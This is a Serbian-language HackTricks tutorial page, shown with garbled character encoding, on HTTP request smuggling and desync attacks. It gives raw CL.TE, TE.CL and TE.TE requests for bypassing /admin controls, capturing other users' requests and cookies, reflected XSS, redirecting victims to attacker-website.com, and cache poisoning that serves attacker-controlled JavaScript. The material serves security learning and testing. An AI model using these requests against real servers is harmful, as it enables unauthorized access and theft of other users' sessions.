# HTTP Request Smuggling / HTTP Desync Attack

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¡ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Å ta je

Ova ranjivost se javlja kada **desinkronizacija** izmeÄ‘u **frontalnih proksija** i **pozadinskog** servera omoguÄ‡ava **napadaÄu** da **poÅ¡alje** HTTP **zahtev** koji Ä‡e biti **tumaÄen** kao **jedan zahtev** od strane **frontalnih** proksija (load balance/reverse-proxy) i **kao 2 zahteva** od strane **pozadinskog** servera.\
To omoguÄ‡ava korisniku da **modifikuje sledeÄ‡i zahtev koji stigne do pozadinskog servera nakon njegovog**.

### Teorija

[**RFC Specifikacija (2161)**](https://tools.ietf.org/html/rfc2616)

> Ako je poruka primljena sa oba, Transfer-Encoding header polje i Content-Length header polje, potonje MORA biti ignorisano.

**Content-Length**

> Content-Length entitetski header oznaÄava veliÄinu entitetskog tela, u bajtovima, poslatog primaocu.

**Transfer-Encoding: chunked**

> Transfer-Encoding header specificira oblik kodiranja koji se koristi za sigurno prenoÅ¡enje sadrÅ¾aja korisniku.\
> Chunked znaÄi da se veliki podaci Å¡alju u seriji delova.

### Stvarnost

**Frontalni** (load-balance / Reverse Proxy) **obraÄ‘uje** _**content-length**_ ili _**transfer-encoding**_ header, a **pozadinski** server **obraÄ‘uje drugi** izazivajuÄ‡i **desinkronizaciju** izmeÄ‘u 2 sistema.\
To moÅ¾e biti veoma kritiÄno jer **napadaÄ moÅ¾e poslati jedan zahtev** na reverse proxy koji Ä‡e biti **tumaÄen** od strane **pozadinskog** servera **kao 2 razliÄita zahteva**. **Opasnost** ove tehnike leÅ¾i u Äinjenici da Ä‡e **pozadinski** server **tumaÄiti** **2. zahtev koji je ubaÄen** kao da je **doÅ¡ao od sledeÄ‡eg klijenta** i **pravi zahtev** tog klijenta Ä‡e biti **deo** **ubaÄenog zahteva**.

### Posebnosti

Zapamtite da u HTTP **novi red karakter se sastoji od 2 bajta:**

* **Content-Length**: Ovaj header koristi **decimalni broj** da oznaÄi **broj** **bajtova** **tela** zahteva. OÄekuje se da telo zavrÅ¡i u poslednjem karakteru, **novi red nije potreban na kraju zahteva**.
* **Transfer-Encoding:** Ovaj header koristi u **telu** **heksadecimalni broj** da oznaÄi **broj** **bajtova** **sledeÄ‡eg dela**. **Deo** mora **zavrÅ¡iti** sa **novim redom**, ali ovaj novi red **se ne raÄuna** od strane indikatora duÅ¾ine. Ova metoda prenosa mora zavrÅ¡iti sa **delom veliÄine 0 praÄ‡enim sa 2 nova reda**: `0`
* **Connection**: Na osnovu mog iskustva, preporuÄuje se koriÅ¡Ä‡enje **`Connection: keep-alive`** na prvom zahtevu u request Smuggling.

## Osnovni Primeri

{% hint style="success" %}
Kada pokuÅ¡avate da iskoristite ovo sa Burp Suite **onemoguÄ‡ite `Update Content-Length` i `Normalize HTTP/1 line endings`** u repeater-u jer neki gadgeti zloupotrebljavaju nove redove, povratne znakove i neispravne content-length vrednosti.
{% endhint %}

HTTP request smuggling napadi se kreiraju slanjem nejasnih zahteva koji koriste razlike u tome kako frontalni i pozadinski serveri tumaÄe `Content-Length` (CL) i `Transfer-Encoding` (TE) heder. Ovi napadi se mogu manifestovati u razliÄitim oblicima, prvenstveno kao **CL.TE**, **TE.CL**, i **TE.TE**. Svaka vrsta predstavlja jedinstvenu kombinaciju naÄina na koji frontalni i pozadinski serveri prioritetizuju ove hedere. Ranjivosti nastaju kada serveri obraÄ‘uju isti zahtev na razliÄite naÄine, Å¡to dovodi do neoÄekivanih i potencijalno zlonamernih ishoda.

### Osnovni Primeri Ranjivosti

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

{% hint style="info" %}
U prethodnu tabelu treba dodati TE.0 tehniku, kao CL.0 tehniku, ali koristeÄ‡i Transfer Encoding.
{% endhint %}

#### CL.TE Ranjivost (Content-Length koristi Frontalni, Transfer-Encoding koristi Pozadinski)

* **Frontalni (CL):** Obradjuje zahtev na osnovu `Content-Length` hedera.
* **Pozadinski (TE):** Obradjuje zahtev na osnovu `Transfer-Encoding` hedera.
* **Scenarijo napada:**
* NapadaÄ Å¡alje zahtev gde vrednost `Content-Length` hedera ne odgovara stvarnoj duÅ¾ini sadrÅ¾aja.
* Frontalni server prosleÄ‘uje ceo zahtev pozadinskom, na osnovu `Content-Length` vrednosti.
* Pozadinski server obraÄ‘uje zahtev kao chunked zbog `Transfer-Encoding: chunked` hedera, tumaÄeÄ‡i preostale podatke kao odvojen, sledeÄ‡i zahtev.
*   **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Ranjivost (Transfer-Encoding koristi Frontalni, Content-Length koristi Pozadinski)

* **Frontalni (TE):** Obradjuje zahtev na osnovu `Transfer-Encoding` hedera.
* **Pozadinski (CL):** Obradjuje zahtev na osnovu `Content-Length` hedera.
* **Scenarijo napada:**
* NapadaÄ Å¡alje chunked zahtev gde veliÄina dela (`7b`) i stvarna duÅ¾ina sadrÅ¾aja (`Content-Length: 4`) ne odgovaraju.
* Frontalni server, poÅ¡tujuÄ‡i `Transfer-Encoding`, prosleÄ‘uje ceo zahtev pozadinskom.
* Pozadinski server, poÅ¡tujuÄ‡i `Content-Length`, obraÄ‘uje samo poÄetni deo zahteva (`7b` bajtova), ostavljajuÄ‡i ostatak kao deo neplaniranog sledeÄ‡eg zahteva.
*   **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE Ranjivost (Transfer-Encoding koriste oba, sa obfuscation)

* **Serveri:** Obe podrÅ¾avaju `Transfer-Encoding`, ali jedan moÅ¾e biti prevaren da ga ignoriÅ¡e putem obfuscation.
* **Scenarijo napada:**
* NapadaÄ Å¡alje zahtev sa obfuskovanim `Transfer-Encoding` hederima.
* U zavisnosti od toga koji server (frontalni ili pozadinski) ne prepozna obfuscation, moÅ¾e se iskoristiti CL.TE ili TE.CL ranjivost.
* NeobraÄ‘eni deo zahteva, kako ga vidi jedan od servera, postaje deo sledeÄ‡eg zahteva, Å¡to dovodi do smuggling-a.
*   **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenarijo (Content-Length koriste oba Frontalni i Pozadinski)**

* Obe servera obraÄ‘uju zahtev iskljuÄivo na osnovu `Content-Length` hedera.
* Ovaj scenario obiÄno ne dovodi do smuggling-a, jer postoji usklaÄ‘enost u tome kako oba servera tumaÄe duÅ¾inu zahteva.
*   **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL.0 Scenarijo**

* Odnosi se na scenarije gde je `Content-Length` header prisutan i ima vrednost razliÄitu od nule, Å¡to ukazuje da telo zahteva ima sadrÅ¾aj. Pozadinski ignoriÅ¡e `Content-Length` header (koji se tretira kao 0), ali frontalni ga analizira.
* KljuÄno je za razumevanje i kreiranje smuggling napada, jer utiÄe na to kako serveri odreÄ‘uju kraj zahteva.
*   **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### TE.0 Scenarijo

* Kao prethodni, ali koristeÄ‡i TE.
* Tehnika [prijavljena ovde](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
* **Primer**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### RuÅ¡enje web servera

Ova tehnika je takoÄ‘e korisna u scenarijima gde je moguÄ‡e **ruÅ¡iti web server dok se Äitaju inicijalni HTTP podaci** ali **bez zatvaranja veze**. Na ovaj naÄin, **telo** HTTP zahteva Ä‡e se smatrati **sledeÄ‡im HTTP zahtevom**.

Na primer, kao Å¡to je objaÅ¡njeno u [**ovoj analizi**](https://mizu.re/post/twisty-python), u Werkzeug-u je bilo moguÄ‡e poslati neke **Unicode** karaktere i to Ä‡e uzrokovati **ruÅ¡enje** servera. MeÄ‘utim, ako je HTTP veza kreirana sa zaglavljem **`Connection: keep-alive`**, telo zahteva neÄ‡e biti proÄitano i veza Ä‡e i dalje biti otvorena, tako da Ä‡e se **telo** zahteva tretirati kao **sledeÄ‡i HTTP zahtev**.

#### Prisiljavanje putem hop-by-hop zaglavlja

Zloupotrebom hop-by-hop zaglavlja moÅ¾ete naznaÄiti proxy-ju da **izbaci zaglavlje Content-Length ili Transfer-Encoding kako bi se HTTP request smuggling mogao zloupotrebiti**.
```
Connection: Content-Length
```
For **viÅ¡e informacija o hop-by-hop header-ima** posetite:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## PronalaÅ¾enje HTTP Request Smuggling

Identifikacija ranjivosti HTTP request smuggling Äesto se moÅ¾e postiÄ‡i koriÅ¡Ä‡enjem tehnika merenja vremena, koje se oslanjaju na posmatranje koliko dugo serveru treba da odgovori na manipulirane zahteve. Ove tehnike su posebno korisne za otkrivanje CL.TE i TE.CL ranjivosti. Pored ovih metoda, postoje i druge strategije i alati koji se mogu koristiti za pronalaÅ¾enje takvih ranjivosti:

### PronalaÅ¾enje CL.TE Ranjivosti KoriÅ¡Ä‡enjem Tehnika Merenja Vremena

* **Metod:**
* PoÅ¡aljite zahtev koji, ako je aplikacija ranjiva, Ä‡e uzrokovati da back-end server Äeka na dodatne podatke.
*   **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Posmatranje:**
* Front-end server obraÄ‘uje zahtev na osnovu `Content-Length` i prekida poruku prerano.
* Back-end server, oÄekujuÄ‡i chunked poruku, Äeka na sledeÄ‡i chunk koji nikada ne dolazi, uzrokujuÄ‡i kaÅ¡njenje.
* **Indikatori:**
* Timeout-ovi ili duga kaÅ¡njenja u odgovoru.
* Primanje 400 Bad Request greÅ¡ke od back-end servera, ponekad sa detaljnim informacijama o serveru.

### PronalaÅ¾enje TE.CL Ranjivosti KoriÅ¡Ä‡enjem Tehnika Merenja Vremena

* **Metod:**
* PoÅ¡aljite zahtev koji, ako je aplikacija ranjiva, Ä‡e uzrokovati da back-end server Äeka na dodatne podatke.
*   **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Posmatranje:**
* Front-end server obraÄ‘uje zahtev na osnovu `Transfer-Encoding` i prosleÄ‘uje celu poruku.
* Back-end server, oÄekujuÄ‡i poruku na osnovu `Content-Length`, Äeka na dodatne podatke koji nikada ne dolaze, uzrokujuÄ‡i kaÅ¡njenje.

### Druge Metode za PronalaÅ¾enje Ranjivosti

* **Analiza Diferencijalnog Odgovora:**
* PoÅ¡aljite blago izmenjene verzije zahteva i posmatrajte da li se odgovori servera razlikuju na neoÄekivan naÄin, Å¡to ukazuje na greÅ¡ku u parsiranju.
* **KoriÅ¡Ä‡enje Automatizovanih Alata:**
* Alati poput Burp Suite-ove 'HTTP Request Smuggler' ekstenzije mogu automatski testirati ove ranjivosti slanjem razliÄitih oblika nejasnih zahteva i analizom odgovora.
* **Testovi Varijacije Content-Length:**
* PoÅ¡aljite zahteve sa razliÄitim `Content-Length` vrednostima koje nisu usklaÄ‘ene sa stvarnom duÅ¾inom sadrÅ¾aja i posmatrajte kako server reaguje na takve neslaganja.
* **Testovi Varijacije Transfer-Encoding:**
* PoÅ¡aljite zahteve sa obfuskovanim ili neispravnim `Transfer-Encoding` header-ima i pratite kako se front-end i back-end serveri razliÄito ponaÅ¡aju na takve manipulacije.

### Testiranje Ranjivosti HTTP Request Smuggling

Nakon potvrÄ‘ivanja efikasnosti tehnika merenja vremena, kljuÄno je proveriti da li se klijentski zahtevi mogu manipulirati. Jednostavna metoda je pokuÅ¡aj trovanja vaÅ¡ih zahteva, na primer, da zahtev za `/` vrati 404 odgovor. Primeri `CL.TE` i `TE.CL` prethodno raspravljani u [Osnovnim Primerima](./#basic-examples) pokazuju kako otrovati klijentov zahtev da izazove 404 odgovor, uprkos tome Å¡to klijent pokuÅ¡ava da pristupi drugom resursu.

**KljuÄne Napomene**

Kada testirate ranjivosti request smuggling-a ometajuÄ‡i druge zahteve, imajte na umu:

* **RazliÄite MreÅ¾ne Konekcije:** "Napad" i "normalni" zahtevi treba da budu poslati preko odvojenih mreÅ¾nih konekcija. KoriÅ¡Ä‡enje iste konekcije za oba ne potvrÄ‘uje prisustvo ranjivosti.
* **Dosledni URL i Parametri:** Ciljajte da koristite identiÄne URL-ove i imena parametara za oba zahteva. Moderne aplikacije Äesto usmeravaju zahteve ka specifiÄnim back-end serverima na osnovu URL-a i parametara. UsklaÄ‘ivanje ovih poveÄ‡ava verovatnoÄ‡u da oba zahteva obraÄ‘uje isti server, Å¡to je preduslov za uspeÅ¡an napad.
* **Vreme i Uslovi Trke:** "Normalni" zahtev, koji je namenjen otkrivanju ometanja od "napadnog" zahteva, takmiÄi se protiv drugih istovremenih zahteva aplikacije. Stoga, poÅ¡aljite "normalni" zahtev odmah nakon "napadnog" zahteva. Zauzete aplikacije mogu zahtevati viÅ¡e pokuÅ¡aja za konaÄnu potvrdu ranjivosti.
* **Izazovi Balansiranja OptereÄ‡enja:** Front-end serveri koji deluju kao balansatori optereÄ‡enja mogu raspodeliti zahteve preko razliÄitih back-end sistema. Ako "napadni" i "normalni" zahtevi zavrÅ¡e na razliÄitim sistemima, napad neÄ‡e uspeti. Ovaj aspekt balansiranja optereÄ‡enja moÅ¾e zahtevati nekoliko pokuÅ¡aja za potvrdu ranjivosti.
* **NepredviÄ‘eni Uticaj na Korisnike:** Ako vaÅ¡ napad nenamerno utiÄe na zahtev drugog korisnika (ne "normalni" zahtev koji ste poslali za detekciju), to ukazuje da je vaÅ¡ napad uticao na drugog korisnika aplikacije. Kontinuirano testiranje moÅ¾e ometati druge korisnike, Å¡to zahteva oprezan pristup.

## Zloupotreba HTTP Request Smuggling

### ZaobilaÅ¾enje Front-End Bezbednosti putem HTTP Request Smuggling

Ponekad, front-end proksi primenjuju bezbednosne mere, preispitujuÄ‡i dolazne zahteve. MeÄ‘utim, ove mere se mogu zaobiÄ‡i iskoriÅ¡Ä‡avanjem HTTP Request Smuggling, omoguÄ‡avajuÄ‡i neovlaÅ¡Ä‡en pristup ograniÄenim krajnjim taÄkama. Na primer, pristup `/admin` moÅ¾e biti zabranjen spolja, pri Äemu front-end proksi aktivno blokira takve pokuÅ¡aje. Ipak, ovaj proksi moÅ¾e zanemariti ugradnje zahteva unutar prokrijumÄarenog HTTP zahteva, ostavljajuÄ‡i rupu za zaobilaÅ¾enje ovih ograniÄenja.

Razmotrite sledeÄ‡e primere koji ilustruju kako se HTTP Request Smuggling moÅ¾e koristiti za zaobilaÅ¾enje front-end bezbednosnih kontrola, posebno ciljajuÄ‡i `/admin` putanju koja je obiÄno zaÅ¡tiÄ‡ena front-end proksijem:

**CL.TE Primer**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
U CL.TE napadu, `Content-Length` zaglavlje se koristi za inicijalni zahtev, dok sledeÄ‡i ugnjeÅ¾deni zahtev koristi `Transfer-Encoding: chunked` zaglavlje. Frontalni proxy obraÄ‘uje inicijalni `POST` zahtev, ali ne uspeva da ispita ugnjeÅ¾deni `GET /admin` zahtev, omoguÄ‡avajuÄ‡i neovlaÅ¡Ä‡en pristup `/admin` putanji.

**TE.CL Primer**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
S druge strane, u TE.CL napadu, inicijalni `POST` zahtev koristi `Transfer-Encoding: chunked`, a sledeÄ‡i ugnjeÅ¾deni zahtev se obraÄ‘uje na osnovu `Content-Length` zaglavlja. SliÄno CL.TE napadu, front-end proxy zanemaruje ugnjeÅ¾deni `GET /admin` zahtev, nenamerno omoguÄ‡avajuÄ‡i pristup ograniÄenom `/admin` putu.

### Otkivanje prepravke front-end zahteva <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Aplikacije Äesto koriste **front-end server** za modifikaciju dolaznih zahteva pre nego Å¡to ih proslede back-end serveru. TipiÄna modifikacija ukljuÄuje dodavanje zaglavlja, kao Å¡to je `X-Forwarded-For: <IP klijenta>`, kako bi se prenela IP adresa klijenta na back-end. Razumevanje ovih modifikacija moÅ¾e biti kljuÄno, jer moÅ¾e otkriti naÄine za **obiÄ‡i zaÅ¡tite** ili **otkriti skrivene informacije ili krajnje taÄke**.

Da biste istraÅ¾ili kako proxy menja zahtev, pronaÄ‘ite POST parametar koji back-end ponavlja u odgovoru. Zatim, kreirajte zahtev, koristeÄ‡i ovaj parametar kao poslednji, sliÄno sledeÄ‡em:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
U ovoj strukturi, sledeÄ‡i delovi zahteva se dodaju nakon `search=`, Å¡to je parametar koji se odraÅ¾ava u odgovoru. Ova refleksija Ä‡e otkriti zaglavlja sledeÄ‡eg zahteva.

VaÅ¾no je uskladiti `Content-Length` zaglavlje ugnjeÅ¾denog zahteva sa stvarnom duÅ¾inom sadrÅ¾aja. PreporuÄuje se da se poÄne sa malom vrednoÅ¡Ä‡u i postepeno poveÄ‡ava, jer Ä‡e previÅ¡e niska vrednost skratiti odraÅ¾ene podatke, dok previÅ¡e visoka vrednost moÅ¾e izazvati greÅ¡ku u zahtevu.

Ova tehnika se takoÄ‘e moÅ¾e primeniti u kontekstu TE.CL ranjivosti, ali zahtev treba da se zavrÅ¡i sa `search=\r\n0`. Bez obzira na karaktere novog reda, vrednosti Ä‡e se dodati parametru pretrage.

Ova metoda prvenstveno sluÅ¾i za razumevanje izmena zahteva koje vrÅ¡i front-end proxy, suÅ¡tinski obavljajuÄ‡i samostalnu istragu.

### Capturing other users' requests <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

MoguÄ‡e je uhvatiti zahteve sledeÄ‡eg korisnika dodavanjem specifiÄnog zahteva kao vrednosti parametra tokom POST operacije. Evo kako se to moÅ¾e postiÄ‡i:

Dodavanjem sledeÄ‡eg zahteva kao vrednosti parametra, moÅ¾ete saÄuvati zahtev sledeÄ‡eg klijenta:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
U ovom scenariju, **parametar komentara** je namenjen za Äuvanje sadrÅ¾aja unutar sekcije komentara posta na javno dostupnoj stranici. Kao rezultat, sadrÅ¾aj narednog zahteva Ä‡e se pojaviti kao komentar.

MeÄ‘utim, ova tehnika ima ograniÄenja. Generalno, hvata podatke samo do delimiÄnog razdvajanja parametara koriÅ¡Ä‡enog u prokrijumÄarenom zahtevu. Za URL-enkodirane forme, ovaj razdvojnik je karakter `&`. To znaÄi da Ä‡e uhvaÄ‡eni sadrÅ¾aj iz zahteva Å¾rtve prestati na prvom `&`, koji moÅ¾e biti deo upitnog niza.

Pored toga, vredi napomenuti da je ovaj pristup takoÄ‘e izvodljiv sa TE.CL ranjivoÅ¡Ä‡u. U takvim sluÄajevima, zahtev bi trebao da se zavrÅ¡i sa `search=\r\n0`. Bez obzira na karaktere novog reda, vrednosti Ä‡e biti dodate parametru pretrage.

### KoriÅ¡Ä‡enje HTTP request smuggling za iskoriÅ¡Ä‡avanje reflektovanog XSS

HTTP Request Smuggling se moÅ¾e iskoristiti za iskoriÅ¡Ä‡avanje web stranica ranjivih na **Reflektovani XSS**, nudeÄ‡i znaÄajne prednosti:

* Interakcija sa ciljnim korisnicima **nije potrebna**.
* OmoguÄ‡ava iskoriÅ¡Ä‡avanje XSS u delovima zahteva koji su **normalno nedostupni**, poput HTTP zaglavlja zahteva.

U scenarijima gde je veb sajt podloÅ¾an Reflektovanom XSS putem User-Agent zaglavlja, sledeÄ‡i payload prikazuje kako iskoristiti ovu ranjivost:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Ovaj payload je strukturiran da iskoristi ranjivost na sledeÄ‡i naÄin:

1. Inicira `POST` zahtev, naizgled tipiÄan, sa `Transfer-Encoding: chunked` header-om da oznaÄi poÄetak Å¡verca.
2. Nakon toga sledi `0`, Å¡to oznaÄava kraj chunked poruke.
3. Zatim se uvodi Å¡vercovani `GET` zahtev, gde je `User-Agent` header zaraÅ¾en skriptom, `<script>alert(1)</script>`, Å¡to pokreÄ‡e XSS kada server obradi ovaj sledeÄ‡i zahtev.

Manipulacijom `User-Agent` kroz Å¡verc, payload zaobilazi normalna ograniÄenja zahteva, Äime se iskoriÅ¡Ä‡ava Reflected XSS ranjivost na nestandardan, ali efikasan naÄin.

#### HTTP/0.9

{% hint style="danger" %}
U sluÄaju da se sadrÅ¾aj korisnika odraÅ¾ava u odgovoru sa **`Content-type`** kao Å¡to je **`text/plain`**, spreÄavajuÄ‡i izvrÅ¡enje XSS. Ako server podrÅ¾ava **HTTP/0.9, moÅ¾da Ä‡e biti moguÄ‡e zaobiÄ‡i ovo**!
{% endhint %}

Verzija HTTP/0.9 je prethodila 1.0 i koristi samo **GET** glagole i **ne** odgovara sa **header-ima**, samo telom.

U [**ovoj analizi**](https://mizu.re/post/twisty-python), ovo je zloupotrebljeno sa Å¡vercom zahteva i **ranjivim krajnjim taÄkom koja Ä‡e odgovoriti sa unosom korisnika** da Å¡vercuje zahtev sa HTTP/0.9. Parametar koji Ä‡e biti odraÅ¾en u odgovoru sadrÅ¾avao je **laÅ¾ni HTTP/1.1 odgovor (sa header-ima i telom)** tako da Ä‡e odgovor sadrÅ¾ati validan izvrÅ¡ni JS kod sa `Content-Type` od `text/html`.

### IskoriÅ¡Ä‡avanje preusmeravanja na lokaciji sa HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Aplikacije Äesto preusmeravaju sa jednog URL-a na drugi koristeÄ‡i ime hosta iz `Host` header-a u URL-u preusmeravanja. Ovo je uobiÄajeno sa web serverima kao Å¡to su Apache i IIS. Na primer, zahtev za folder bez zavrÅ¡nog kosa rezultira preusmeravanjem da ukljuÄi kosu:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Rezultati u:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Iako naizgled bezopasno, ovo ponaÅ¡anje se moÅ¾e iskoristiti pomoÄ‡u HTTP request smuggling-a za preusmeravanje korisnika na spoljaÅ¡nju stranicu. Na primer:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Ova prokrijumÄarena zahtev moÅ¾e uzrokovati da sledeÄ‡i obraÄ‘eni korisniÄki zahtev bude preusmeren na veb sajt pod kontrolom napadaÄa:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Rezultati u:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
U ovom scenariju, korisniÄki zahtev za JavaScript datotekom je preuzet. NapadaÄ moÅ¾e potencijalno kompromitovati korisnika tako Å¡to Ä‡e posluÅ¾iti zlonamerni JavaScript kao odgovor.

### IskoriÅ¡Ä‡avanje trovanja web keÅ¡om putem HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Trovanje web keÅ¡om moÅ¾e se izvrÅ¡iti ako bilo koja komponenta **infrastrukture front-end keÅ¡ira sadrÅ¾aj**, obiÄno radi poboljÅ¡anja performansi. Manipulacijom serverovog odgovora, moguÄ‡e je **otrovati keÅ¡**.

Prethodno smo posmatrali kako se serverovi odgovori mogu izmeniti da vrate 404 greÅ¡ku (pogledajte [Osnovni primeri](./#basic-examples)). SliÄno tome, moguÄ‡e je prevariti server da isporuÄi sadrÅ¾aj `/index.html` kao odgovor na zahtev za `/static/include.js`. Kao rezultat, sadrÅ¾aj `/static/include.js` se zamenjuje u keÅ¡u sa onim od `/index.html`, ÄineÄ‡i `/static/include.js` nedostupnim korisnicima, Å¡to potencijalno moÅ¾e dovesti do Denial of Service (DoS).

Ova tehnika postaje posebno moÄ‡na ako se otkrije **ranjivost Open Redirect** ili ako postoji **preusmeravanje na sajtu ka otvorenom preusmeravanju**. Takve ranjivosti se mogu iskoristiti za zamenu keÅ¡iranog sadrÅ¾aja `/static/include.js` sa skriptom pod kontrolom napadaÄa, Å¡to suÅ¡tinski omoguÄ‡ava Å¡iroku Cross-Site Scripting (XSS) napad protiv svih klijenata koji zahtevaju aÅ¾urirani `/static/include.js`.

Ispod je ilustracija iskoriÅ¡Ä‡avanja **trovanja keÅ¡a u kombinaciji sa preusmeravanjem na sajtu ka otvorenom preusmeravanju**. Cilj je izmeniti keÅ¡ sadrÅ¾aj `/static/include.js` da posluÅ¾uje JavaScript kod pod kontrolom napadaÄa:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Napomena o ugraÄ‘enom zahtevu koji cilja `/post/next?postId=3`. Ovaj zahtev Ä‡e biti preusmeren na `/post?postId=4`, koristeÄ‡i **Host header value** za odreÄ‘ivanje domena. Menjanjem **Host header-a**, napadaÄ moÅ¾e preusmeriti zahtev na svoj domen (**on-site redirect to open redirect**).

Nakon uspeÅ¡nog **socket poisoning-a**, treba inicirati **GET request** za `/static/include.js`. Ovaj zahtev Ä‡e biti kontaminiran prethodnim **on-site redirect to open redirect** zahtevom i preuzeti sadrÅ¾aj skripte koju kontroliÅ¡e napadaÄ.

